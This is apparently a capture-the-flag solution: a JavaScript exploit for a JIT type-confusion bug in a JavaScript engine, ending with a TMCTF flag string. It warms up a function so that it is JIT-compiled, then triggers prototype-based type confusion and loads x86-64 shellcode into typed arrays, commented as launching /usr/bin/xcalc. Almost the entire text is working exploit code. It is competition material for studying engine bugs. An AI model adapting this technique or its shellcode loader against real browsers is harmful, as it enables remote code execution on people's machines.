
Enter JS Code:
function opt(o, proto, value) {
    o.b = 0x1337;
    let tmp = {__proto__: proto};
    o.a = value;
}

function main() {
    for (let i = 0; i < 20000; i++) {
        let o = {a: 1, b: 2};
        opt(o, {}, {});
    }
    
    let o = {a: 1, b: 2};
    let leak = {z: {}, x: {}};
    let oo = {c: 0xdead, d: 0xbeef};
    opt(o, o, oo);

    let s = {};
    var buf = new ArrayBuffer(1000);
    var shellcode = new Uint32Array(buf);
    var buf2 = new ArrayBuffer(1000);
    var shellcode2 = new Uint32Array(buf2);
    var buf3 = new ArrayBuffer(1000);
    var shellcode3 = new Uint32Array(buf3);
    // our shellcode
    // open /usr/bin/xcalc
    shellcode3[0] = 0x686a9090;
    shellcode3[1] = 0x622fb848;
    shellcode3[2] = 0x622f6e69;
    shellcode3[3] = 0x48507361;
    shellcode3[4] = 0xb848e789;
    shellcode3[5] = 0x1010101;
    shellcode3[6] = 0x1010101;
    shellcode3[7] = 0x27b84850;
    shellcode3[8] = 0x3f330131;
    shellcode3[9] = 0x48013027;
    shellcode3[10] = 0x48240431;
    shellcode3[11] = 0x10101b8;
    shellcode3[12] = 0x1010101;
    shellcode3[13] = 0xb8485001;
    shellcode3[14] = 0x606d6721;
    shellcode3[15] = 0x3f300166;
    shellcode3[16] = 0x24043148;
    shellcode3[17] = 0x101b848;
    shellcode3[18] = 0x1010101;
    shellcode3[19] = 0x48500101;
    shellcode3[20] = 0x2c0169b8;
    shellcode3[21] = 0x60620162;
    shellcode3[22] = 0x4314875;
    shellcode3[23] = 0x2fb84824;
    shellcode3[24] = 0x2f6e6962;
    shellcode3[25] = 0x50736162;
    shellcode3[26] = 0x6a56f631;
    shellcode3[27] = 0x1485e23;
    shellcode3[28] = 0x266a56e6;
    shellcode3[29] = 0xe601485e;
    shellcode3[30] = 0x5e256a56;
    shellcode3[31] = 0x56e60148;
    shellcode3[32] = 0x485e2a6a;
    shellcode3[33] = 0x6a56e601;
    shellcode3[34] = 0x1485e28;
    shellcode3[35] = 0x894856e6;
    shellcode3[36] = 0x6ad231e6;
    shellcode3[37] = 0x50f583b;

    let ddd = {x:shellcode, y:shellcode};
    oo.c = shellcode;
    o.a = shellcode;
    oo.c = 0x9447;
}
main();
.TMCTF{0ldj1773r_15_7yp3_c0nfu510n_0f_dyn4m1c0bj3c7}
